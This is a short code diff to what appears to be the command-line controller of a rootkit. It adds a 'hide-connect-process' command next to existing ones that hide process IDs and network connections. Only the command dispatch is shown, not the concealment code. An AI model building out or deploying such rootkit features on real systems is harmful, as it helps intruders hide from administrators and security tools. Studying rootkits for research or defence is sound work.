@@ -14,7 +14,7 @@ int main(int argc, const char* argv[])
 	{
 		return logError("couldn't open a handle");
 	}
-
+	
 	const char* cmd = argv[1];
 	if (!strcmp(cmd, "check-connection"))
 	{
@@ -35,6 +35,10 @@ int main(int argc, const char* argv[])
 	else if (!strcmp(cmd, "hide-connect-pid"))
 	{
 		return rootkit_handler.CmdNetHideConnectPID(argc, argv);
+	}
+	else if (!strcmp(cmd, "hide-connect-process"))
+	{
+		return rootkit_handler.CmdNetHideConnectProcessName(argc, argv);
 	}
 	else if (!strcmp(cmd, "hide-pid"))
 	{
